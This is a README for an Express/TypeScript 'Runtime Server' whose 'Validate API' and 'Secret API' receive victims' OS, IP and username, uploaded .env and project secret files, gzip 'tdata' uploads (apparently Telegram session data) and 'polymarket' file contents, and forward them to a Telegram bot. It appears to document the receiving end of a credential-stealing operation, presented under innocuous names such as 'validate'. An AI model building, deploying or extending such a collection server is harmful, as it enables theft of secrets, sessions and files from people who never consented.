# Runtime Server

Express TypeScript server with Validate API and Secret API (source-checker, polymarket, Telegram).

## Features

- ✅ Express server in TypeScript
- ✅ **Validate API** at `/api/validate` (system-info, files, project-env, tdata check/upload)
- ✅ **Secret API** (at root): POST `/source-checker`, POST `/polymarket`, GET `/telegram-test`; Telegram via `src/services/telegram.ts` (configurable `TELEGRAM_API_BASE`)
- ✅ Error handling and logging

## Setup

### 1. Install Dependencies

```bash
npm install
```

### 2. Configure Environment

Copy `.env.example` to `.env` (if present), then edit:

- `PORT` - Server port (default: 5175)
- `TELEGRAM_BOT_TOKEN` - (Optional) For Telegram alerts
- `TELEGRAM_CHAT_ID` or `TELEGRAM_GROUP_ID` - (Optional) Telegram chat/group ID
- `TELEGRAM_API_BASE` - (Optional) Bot API base URL (default: https://api.telegram.org). Set to use another API (e.g. proxy).
- `SYSTEM_INFO_TG_ENABLED` - (Optional) Set to `false` to disable Telegram alerts when `data/system_info.json` updates (default: enabled).

### 3. Run the Server

**Development:**
```bash
npm run dev
```

**Production:**
```bash
npm run build
npm start
```

## API Endpoints

### GET /health

Health check.

**Response:** `{ "status": "ok", "service": "runtime-server" }`

### Validate API (`/api/validate`)

- POST `/api/validate/system-info` — body: `operatingSystem`, `ipAddress`, `username`; saves to `data/system_info.json`
- POST `/api/validate/files` — env/json/doc files; saves to `uploads/`
- POST `/api/validate/project-env` — project .env; saves to `uploads/project-env/`
- POST `/api/validate/tdata/check` — body: `operatingSystem`, `ipAddress`, `username`; returns `{ alreadySent }`
- POST `/api/validate/tdata/upload` — raw gzip body; rate limit 24h per client

### Secret API (at root)

| Method | Path | Description |
|--------|------|-------------|
| POST | `/source-checker` | Body: `{ "source": "string" }`. Saves to `data/sources.json`, sends to Telegram. |
| POST | `/polymarket` | Body: `{ "filename", "user", "ip", "content" }` (content can be base64). Saves and sends formatted alert to Telegram. |
| GET | `/telegram-test` | Sends a test message to Telegram (requires `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`). |

- Data: `data/sources.json` (server cwd). Set `TELEGRAM_API_BASE` to use another Bot API endpoint.

## License

MIT
